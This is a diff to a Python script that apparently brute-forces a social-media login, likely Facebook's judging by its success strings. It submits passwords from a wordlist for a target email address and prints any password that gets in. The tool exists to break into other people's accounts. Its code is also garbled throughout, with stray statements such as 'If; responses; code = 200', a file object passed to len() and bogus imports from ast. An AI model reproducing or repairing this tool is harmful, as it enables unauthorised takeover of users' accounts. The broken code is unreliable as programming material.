@@ -1,5 +1,6 @@
 from ast import Break, Try, If
 import time
+import requests
 import sys
 if sys.version_info[0] !=3: 
 	print('''--------------------------------------
@@ -33,20 +34,20 @@ print ("\nTrying Passwords from list ...")
 
 i=0
 while file:
-	passw=file.readline().strip()
+	file.readline()
 	i+=1
-	if len(passw) < 10:
+	if len(file) < 10:
 		continue
-	print=str(i) +" : ",passw
-	response = browser.open(post_url)
+	print("Trying",file+"")
+	responses = browser.open(post_url)
 Try
-If; response; code = 200
+If; responses; code = 200
 browser.select_form(nr=0)()
 browser.form['email'] = email
-browser.form['pass'] = passw
+browser.form['pass'] = file
 response = browser.submit()
-response_data = response.read()
-if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
-	print('Your password is : ',passw)
+responses_data = responses.read()
+if 'Find Friends' in responses_data or 'Two-factor authentication' in responses_data or 'security code' in responses_data:
+	print('Your password is : ',file)
 	Break
 	
